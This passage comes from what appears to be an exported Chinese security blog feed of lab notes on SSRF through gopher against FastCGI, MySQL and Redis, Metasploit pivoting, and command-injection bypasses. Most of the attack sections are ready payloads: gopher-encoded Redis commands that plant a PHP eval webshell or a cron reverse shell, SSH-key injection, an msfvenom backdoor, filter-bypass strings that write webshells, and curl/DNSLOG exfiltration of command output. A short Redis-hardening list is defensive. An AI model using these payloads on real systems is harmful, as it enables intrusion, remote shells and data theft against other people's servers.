exit;?&gt;" -p 2333 127.0.0.1 php文件绝对路径 fpm.py地址https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75url编码 1234f = open('1.txt')ff = f.read()from urllib import quoteprint quote(ff) 得到gopher的exp 1curl 'gopher://127.0.0.1:9000/_%01%01%97%9C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%97%9C%01%D5%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%15SCRIPT_FILENAME/var/www/html/123.php%0B%15SCRIPT_NAME/var/www/html/123.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%15REQUEST_URI/var/www/html/123.php%01%04%97%9C%00%00%00%00%01%05%97%9C%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%97%9C%00%00%00%00' gopher攻击内网mysql MySQL有密码和无密码的认证方式不一样，无密码认证时直接发送TCP/IP数据包即可访问，有密码数据包中存在加盐加密。如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。 首先配置数据库，kali默认安装的为MariaDB，配置路径与mysql不同； 1234#进入mysql命令行，设置无密码：SET PASSWORD FOR root@localhost=PASSWORD('');#修改配置文件：vim /etc/mysql/mariadb.conf.d/50-server.cnf，添加skip-grant-tables 在kali下打开wireshark，监听any网卡 执行命令 123mysql -h127.0.0.1 -uroot -p#必须指定-h，否则流量不走网卡，无法抓取select flag from ssrf.flag;exit; 筛选出mysql数据包 跟踪TCP流，选取request请求，并显示为原始数据 编码为gopher协议格式 12345678910#encoding:utf-8def result(s): a=[s[i:i+2] for i in xrange(0,len(s),2)]#两两一组 return "curl gopher://127.0.0.1:3306/_%" + "%".join(a)if __name__ == '__main__': import sys s=sys.argv[1] print result(s) 得到payload 1curl gopher://127.0.0.1:3306/_%ae%00%00%01%85%a6%3f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%71%03%5f%6f%73%10%64%65%62%69%61%6e%2d%6c%69%6e%75%78%2d%67%6e%75%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%31%30%33%38%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%32%36%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%16%00%00%00%03%73%65%6c%65%63%74%2a%66%72%6f%6d%20%73%73%72%66%2e%66%6c%61%67%01%00%00%00%01 --output - &gt; mysql.txt 使用strings命令读取mysql.txt，获得输出结果 1strings mysql.txt gopher局限 大部分 PHP 并不会开启 fopen 的 gopher wrapper file_get_contents 的 gopher 协议不能 URLencode file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败 PHP 的 curl 默认不 follow 302 跳转 curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断）， 7.49 可用 bypass技巧 利用解析url绕过正则缺陷 123http://A.com@127.0.0.1http://A.com:B@127.0.0.1127.0.0.1#http://abc 原理： 123456789 authority path ┌───────────────┴─────────────────┐ ┌────┴───┐ abc://[username[:password]@](example.com)[:123]/path/data?key=value&amp;key2=value2#fragid1 └┬┘ └───────┬──────────┘ └────┬────┘ └──┬─┘ └─────────┬─────────┘ └──┬──┘scheme user information host port query fragment urn:example:mammal:monotreme:echidna └┬┘ └──────────────┬───────────────┘scheme path IP进制转换 123456#ip:127.0.0.1（1）8进制格式：0177.0.0.1（2）16进制格式：0x7F.00.00.01（3）8进制整数格式：017700000001（3）10进制整数格式：2130706433（4）16进制整数格式：0x7f000001 转换方法 8进制前加0，16进制前加0x 将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制 关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制 短网址 12（1）百度短网址转换：https://dwz.cn #不支持ip（2）TinyURL：https://tinyurl.com/create.php #支持ip 可以指向任意 ip 的域名：xip.io 12345678910111213#ip:127.0.0.1127.0.0.1.xip.iowww.127.0.0.1.xip.iomysite.127.0.0.1.xip.iofoo.bar.127.0.0.1.xip.io#利用ssrf.php?url=http://127.0.0.1.xip.io/orssrf.php?url=http://www.127.0.0.1.xip.io/orssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/orssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info 句号绕过：127。0。0。1 添加端口号 案例：内网编织者百度内网手动编织! 利用dns将域名解析为内网ip 利用301或者302跳转 123http://www.th1s.cn/test/ssrf.phpssrf.php里面的内容为：&lt;?php header('Location:10.1.1.1');?&gt; 参考文章 SSRF学习笔记 ssrf攻击内网应用 SSRF 学习笔记 gopher 协议攻击内网 mysql gopher SSRF攻击内网应用复现]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis漏洞利用与SSRF]]></title>
    <url>%2F2019%2F09%2F02%2FRedis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8ESSRF%2F</url>
    <content type="text"><![CDATA[前言本想重新总结一下ssrf，但一想gopher攻击redis还没了解过，于是单独学习redis漏洞利用，复现过程中记录了这一篇文章。 关于redisredis是一种key-value键值对的非关系型数据库，默认运行在6379端口 它启动时不会像apache一样，以一种www-data低权限身份运行。而是以运行者的身份，例如用root权限直接运行redis时，redis的权限就是root权限 其次它的默认配置是无需密码，可能会造成默认的未授权访问 redis还支持本地存储，如果配置不当将导致任意文件写入的发生 未授权访问redis环境搭建靶机： os：centos7 ip：192.168.64.136 安装redis 1234567891011#第一步：下载redis安装包wget http://download.redis.io/releases/redis-4.0.6.tar.gz#第二步：解压压缩包tar -zxvf redis-4.0.6.tar.gz#第三步：yum安装gcc依赖yum install gcc#第四步：跳转到redis解压目录下cd redis-4.0.6#第五步：编译安装make MALLOC=libccd src &amp;&amp; make install 同时修改redis配文件 1vim redis.conf 在bind 127.0.0.1 前插入“#“，同时将保护模式protected mode的值更改为“no”，通过这条设置，其他服务器将允许连接redis并且可做出写入等操作。 启动redis 1234#直接启动[root@localhost src]# ./redis-server#带上配置文件启动[root@localhost redis-4.0.6]# ./src/redis-server redis.conf 攻击机： os：Ubuntu18.04 ip：192.168.64.142 安装redis 12sudo apt-get updatesudo apt-get install redis-server 值得一提的是，通过apt-get安装redis并运行，redis权限为redis并非为root 写入SSH key现在攻击机本地~/.ssh目录下生成一对密钥：id_rsa和id_rsa.pub 1xm@xm：〜/ .ssh $ ssh-keygen -t rsa 然后连接靶机的redis，并写入ssh公钥id_rsa.pub 12345redis-cli -h 192.168.64.136#连接靶机config set dir /root/.ssh #设置本地存储文件目录config set dbfilename authorized_keys #设置本地存储文件名\set x "\n\n\n[本地id_rsa.pub的值]\n\n\n"#设置一个值为id_rsa.pub公钥值save#存储数据 成功在靶机中写入公钥，直接通过ssh连接： 1ssh -i id_rsa root@192.168.64.136#指定私钥 利用计划任务反弹shell类似于上面的redis文件写入，写入定时命令 12345redis-cli -h 192.168.64.136#连接靶机set x "\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.64.136/2333 0&lt;&amp;1 2&gt;&amp;1\n"#每秒钟弹一次shellconfig set dir /var/spool/cron/config set dbfilename rootsave 写入成功后本地监听2333端口，接收到反弹的shell 写入webshell12345redis-cli -h 192.168.64.136#连接靶机set x "&lt;?php phpinfo();?&gt;"config set dir /var/www/html/config set dbfilename shell.phpsave 成功在web目录下生成shell.php SSRF攻击redis 未授权访问redis条件存在限制，若开启了protected-mode，外网访问是不具有写入权限的；若绑定了127.0.0.1，那么外网将无法访问；但如果存在SSRF漏洞，那么通过Gopher协议可对本地redis进行攻击 Gopher协议是HTTP协议出现之前，在Internet上常常和常用的一个协议。当然现在Gopher协议已经慢慢淡出历史.Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP，Telnet，Redis，Memcache，也可以进行GET，POST请求。这无疑极大拓宽了SSRF的攻击面。 payload：gopher://ip:port/_payload 写入webshell将一下命令打包成gopher.sh文件 12345redis-cli -h $1 -p $2 set 1 '&lt;?php eval($_POST["pass"]);?&gt;'redis-cli -h $1 -p $2 config set dir /var/www/htmlredis-cli -h $1 -p $2 config set dbfilename bbb.phpredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 使用socat进行端口转发 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。 执行./gopher.sh 127.0.0.1 4444，抓取到数据并写入1.txt： 将捕捉到的转换为gopher格式 python转换脚本： 1234567f = open('1.txt', 'r')s = ''for line in f.readlines(): line = line.replace(r"\r", "%0d%0a") line = line.replace("\n", '') s = s + lineprint s.replace("$", "%24") 此处需要注意，使用python脚本将流量内容转换后，还需要将一句话中的$、?、;、[、]这几个字符url编码，否则会提示curl: (3) [globbing] illegal character in range specification at pos 103 如果写入免杀的一句话，一步步fuzz即可。 模拟ssrf访问： 1[root@localhost xm]# curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2429%0d%0a%3c%3fphp eval(%24_POST%5b"pass"%5d)%3b%3f%3e%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a/var/www/html%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0abbb.php%0d%0a*1%0d%0a%244%0d%0asave%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a' 成功在/var/www/html/下生成bbb.php 反弹shell 文件名必须为root，此处靶机环境为centos7，其他Linux需要修改目录 首先要明确第一点，用写入crontab的方式要求redis必须是root用户启动，否则无法正常执行 将下列内容写入gopher.sh中： 12345echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 本地监听： 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 执行gopher.sh并捕捉到流量，将其写入至1.txt： 将捕捉到的转换为gopher格式 python转换脚本： 12345678910111213141516171819202122#coding: utf-8import sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue elif line[-3:-1] == r'\r': if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\r', '%0d%0a') line = line.replace('\n', '') exp = exp + line elif line == '\x0a': exp = exp + '%0a' else: line = line.replace('\n', '') exp = exp + lineprint exp 转换结果为： 1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a%0a P.S. 需要注意的是，如果要换IP和端口，前面的$63也需要更改，$63表示字符串长度为63个字节 模拟ssrf访问： 123456789[root@localhost xm]# curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a%0a'* About to connect() to 127.0.0.1 port 6379 (#0)* Trying 127.0.0.1...* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)+OK+OK+OK+OK+OK 在攻击机中nc -lvp 2333获得root权限shell 写入SSH key 这部分在第二天写的，但是情况发生了变化，上述方法出现了问题，不知道原因何在，因此换一种方法 但十分巧合的是，本部分使用的方法在昨天并不奏效 端口转发 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 redis连接4444端口 1redis-cli -p 4444 输入payload 12345set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm\n\n\n"config set dir /root/.ssh/config set dbfilename authorized_keyssavequit 同时监听到数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&gt; 2019/09/02 11:34:54.610419 length=420 from=17 to=436*3\r$3\rset\r$1\rx\r$392\rssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm\r&lt; 2019/09/02 11:34:54.611433 length=5 from=10163 to=10167+OK\r&gt; 2019/09/02 11:35:09.983344 length=52 from=437 to=488*4\r$6\rconfig\r$3\rset\r$3\rdir\r$11\r/root/.ssh/\r&lt; 2019/09/02 11:35:09.983666 length=5 from=10168 to=10172+OK\r&gt; 2019/09/02 11:35:22.865691 length=64 from=489 to=552*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$15\rauthorized_keys\r&lt; 2019/09/02 11:35:22.865862 length=5 from=10173 to=10177+OK\r&gt; 2019/09/02 11:35:26.353675 length=14 from=553 to=566*1\r$4\rsave\r&lt; 2019/09/02 11:35:26.354787 length=5 from=10178 to=10182+OK\r 使用python脚本进行转换 12[root@localhost ~]# python gopher.py 1.txt *3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$386%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0a%0a 成功生成authorized_keys 成功连接 其他问题 由于每一种Linux的定时任务文件位置不一，同时各种环境问题，可能会导致payload的执行失败 本文章的复现环境为centos7，尚未测试在Ubuntu下的情况，但从网络上的教程上来看，Ubuntu下复现反弹shell存在问题 这里照搬文章记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现和解决ubuntu任务计划写shell失败的问题 从两篇文章来看，Ubuntu下反弹shell失败的原因是通过redis写入定时任务文件中，存在大量的其他杂乱字符，这些字符在centos7下会被忽略，但是在Ubuntu下不会忽略，于是导致了通过定时任务弹shell的失败；但写入文件和ssh是可行的。 防御建议 修改redis.conf配置文件，改变高危命令名称 123rename-command FLUSHALL ""rename-command CONFIG ""rename-command EVAL "" 以低权限运行redis服务 为redis添加密码验证 禁止外网访问redis 1bind 127.0.0.1 开启保护模式protected mode yes 修改默认端口 1Port 6379 防火墙设置策略，设置ip白名单 参考文章 CENTOS7下安装redis 先知——Redis和SSRF 利用redis通过cron进行Getshell（配合SSRF利用） redis未授权访问与ssrf利用 利用 Gopher 协议拓展攻击面 redis getshell 总结 SSRF 漏洞学习 https://github.com/kingkaki/Exploit-scripts/tree/master/redis]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSRF</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用MSF进行跳板]]></title>
    <url>%2F2019%2F08%2F27%2F%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[环境搭建环境介绍为了更真实地模拟现实情况，熟悉MSF跳转攻击内网其他主机的姿势，熟悉内网渗透，因此这里利用一个开源免费的火墙镜像文件M0n0wall在VMware虚拟机上搭建一个小型的带防火墙的网络。 由于所需虚拟机数量较多、占用内存较大，因此局域网1在本机VMware下搭建，局域网2在物理机局域网下的一台主机virtual box下搭建。 网络拓扑 搭建 搭建过程略微繁琐，有些地方非常坑人，花费大量时间在环境搭建上 此处简要概括主要步骤 局域网1防火墙安装 在VMware中创建一台虚拟机，安装m0n0wall，并设置两块网卡，一是与物理机桥接，而是设置为virtual host only 选择1，配置LAN以及WAN（le0、le1为网卡名称） 选择2，配置mono的LAN ip地址 安装成功： 攻击机配置 将攻击机kali的网卡设置为与防火墙virtual host only网卡，重新配置网络，IP发生变化 浏览器访问1.1.1.1，输入账号:admin，密码:mono，进入防火墙设置 首先，点击”WAN”-&gt;取消勾选” Block private networks”，经过测试，不关闭此选项物理机无法访问到防火墙以及映射的内网主机端口 然后，点击”NAT”，设置端口，将防火墙”公网”IP的端口，转发给内网攻击机的相应端口 先后转发80、4444端口 完成后，kali启动Apache服务，物理机访问防火墙公网IP，自动转发到了kali的Apache服务 局域网2virtualbox同VMware的操作大同小异，同样先安装好m0n0wall，进行各项设置。 但有一个深坑，m0n0wall上无法获取到WAN IP，后来得知，需要将使用的virtual host网卡的控制芯片更改为 安装成功后登陆浏览器进行设置，此处不用过多设置，默认允许内网访问到外网（但需假设xp无法访问到外网，仅能与内网主机windows7通信） 同时需要将Windows7、Windows xp的网卡设置为仅主机模式，完成后IP将自动发生变化 渗透复盘获取meterpreter shell在攻击机中生成后门程序 123456789msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.124 LPORT=4444 -a x86 --platform windows -b "\x00\xff" -e x86/shikata_ga_nai -f exe -o shell.exe#LHOST设置为防火墙公网ip#执行监听use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lhost 192.168.0.116set lport 4444exploit 将后门执行移动到web目录下，目标Windows7主机访问192.168.0.127/shell.exe下载并点击，MSF收到响应，在meterpreter下提权，并发现当前主机存在于内网 meterpreter进行跳板攻击添加路由 此处曾将后门进程迁移到其他进程上，但是无法成功扫描 1run autoroute -h 12run autoroute -s 2.2.2.0/24#添加路由run autoroute -p#显示添加的路由 扫描内网1.msf自带模块1use auxiliary/scanner/portscan/tcp#该扫描模式准确但速度慢 2.通过跳板使用nmap 使用GNU\Linux操作系统内置的ProxyChains工具，任何TCP连接都能通过TOR、SCOKS4、SOCKS、HTTP/HTTPS等代理方式进行转发。在这项隧道技术中，可以嵌套多层代理。除了提供匿名性以外，如跳板机这样的利用也能实现向隔离的内部网络导入流量。 建立好路由后直接使用nmap去扫描内网主机是不可行的，需要通过socks4代理进行流量转发。 123use auxiliary/server/socks4a set SRVHOST 1.1.1.10 #攻击者IPrun 然后标记本地文件vim /etc/proxychains.conf，最后一行修改为SRVHOST的IP 1234567--- snippet ---[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"#socks4 127.0.0.1 9050socks4 1.1.1.10 1080 payload： 1proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse -A 2.2.2.21 远程溢出漏洞利用ms08_067漏洞，此处LHOST设置为作为跳板的Windows7，因为xp无法直接连接外网 端口转发1portfwd -h 将xp系统的3389端口转发至本地 连接本地端口3389 参考文章 虚拟机M0n0wall软件防火墙配置 M0N0wall搭建情况 通过双重跳板漫游隔离内网]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>MSF</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行漏洞总结]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可 命令执行漏洞 命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，``等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。 命令执行几种方式 函数 注意事项 system() passthru() exec()、shell_exec() 无回显 反引号`` 命令交给shell_exec()执行 popen()、proc_open() 无回显，返回文件指针，但命令执行了的 以popen()为例： 123&lt;?php popen('whoami &gt;&gt;/tmp/1.txt','r');?&gt; 查看1.txt得到结果 命令执行绕过技巧空格绕过 &lt; 与 &lt;&gt; 仅适用于文件读取等操作，例如：cat&lt;flag %09 TAB的url编码 ${IFS} $IFS$9 ${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 命令连接符 分隔符 含义 %0a 换行符 %0d 回车符 ; 在Linux shell中担任连续指令[将显示所有指令结果] &amp; A&amp;B 简单拼接无制约关系。如果A为假，则B立即执行 | A|B 左边输出作为右边的输入，显示B的执行结果 &amp;&amp; A&amp;&amp;B 只有A执行成功，B才会执行 || A||B 只有A执行失败，B才会执行 黑名单绕过 ${PS2} 对应字符 &gt; ${PS4} 对应字符 + ${9} 对应 空字符串 变量拼接1a=l;b=s;$a$b base64编码12echo Y2F0IDEudHh0|base64 -d|bash#cat 1.txt 十六进制编码12345678910#编码echo "cat 1.txt"|xxd -p#解码echo "63617420312e7478740a"|xxd -r -p |bash#其他$(printf "\154\163") ==&gt;ls$(printf "\x63\x61\x74\x20\x66\x6c\x61\x67") ==&gt;cat flag&#123;printf,"\x63\x61\x74\x20\x66\x6c\x61\x67"&#125;|$0 ==&gt;cat /flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125; &gt;&gt; 1.php 单、双引号1ca""t fla''g 反斜线1c\a\t f\l\a\g 利用Shell 特殊变量绕过 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。 12ca$@t fla$@g#cat flag 通配符绕过 字符 解释 * 匹配任意长度任意字符 ？ 匹配任意单个字符 [list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合 {str1,str2} 匹配str1或者str2字符，也可以是集合 [^list] 匹配指定范围外的任意单个字符或字符集合 12cat fl*cat fla? 无回显的命令执行反弹shell 此处列举的反弹shell存在局限性，一些环境下无法正常使用，之后重新总结一下反弹shell 123|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1#远程监听nc -lvp 8080 DNSLOG ``中的命令实际上调用了shell_exec()函数 12curl http://07isyd.dnslog.cn/`whoami`ping `whoami`.07isyd.dnslog.cn curl上传文件 curl -F将flag文件上传至Burpsuite中的Collaborator Client，类似于DNSLOG，但可以查看POST请求包 实际上也可以将flag文件上传至vps某个端口监听 打开Collaborator Client： 12打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor Client -- &gt; 点击 Copy to Clipboard粘贴出来大概这样：XXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net 短命令执行 大体思路为将命令分割为一个个小部分，写成文件名，再通过ls写入到一个文件中并执行。 但利用起来发现也挺苛刻的，网上一些教程复现下来失败 复现反思： 直接利用1&gt;1这样的方式写命令是不可行的，因为执行ls -t &gt; a这一步会在每一个文件名的后面加一个换行符，导致无法执行。 两个反斜杠\\，这种方法是利用\来拼接字符串，其中前一个\是用来转义后一个\的。这种方法的话需要精心构造输入，利用倒叙来输入，然后ls的时候需要加-t参数来排列一下，虽然报错了但是也执行成功了。 环境：物理机web目录index.html中写入phpinfo 12345678910&gt;hp&gt;ell.p\\&gt;\ sh\\&gt;\ -O\\&gt;0.117\\&gt;168.\\&gt;\ 192.\\&gt;wget\\ls -t&gt;ash a 然后生成shell.php，访问即phpinfo界面 IP绕过转换网址 进制转换 例如：127.0.0.1 =&gt; 017700000001 将IP的每一位先从十进制转换为十六进制，再转为八进制，在八进制前添加一个0. 漏洞防范命令防注入函数 escapeshellcmd()和escapeshellarg() escapeshellcmd(string $command): 顾名思义，该函数是过滤整条命令的从，传入参数为命令。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 反斜线（\）会在以下字符之前插入： &amp;#`;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF，’ 和 *”* 仅在不配对的时候被转义。 在Windows 平台上，所有这些字符以及 % 和 ! 字符都会被^转义。 在Linux平台上，字符被反斜杠\转义。 escapeshellarg(string $command): escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，它会将双引号替换为空格 此处想顺便写一下，这两种函数一起用的时候也存在逃逸的情况： addslashes()等过滤sql语句的函数 参数白名单直接在代码或配置文件中限定某些参数，使用时候匹配一下这个参数是否不再这个白名单，如果不在则直接显示错误提示。 参考文章 浅谈CTF中命令执行与绕过的小技巧 无回显代码执行利用方法 命令执行的一些绕过技巧 ctf命令执行与绕过 巧用命令注入的N种方式 PHP复杂变量绕过addslashes()直接拿shell CTF命令执行及绕过技巧]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>命令执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows2008渗透测试（一）]]></title>
    <url>%2F2019%2F08%2F16%2Fwindows2008_1%2F</url>
    <content type="text"><![CDATA[环境靶机： IP:192.168.64.139 系统：windows 2008 攻击机： IP:192.168.64.131 系统：kali 渗透信息收集nmap -A 192.168.64.139 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-06 08:35 EDTNmap scan report for 192.168.64.139Host is up (0.00041s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-cookie-flags: | /: | ASPSESSIONIDQSCTABQS: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: 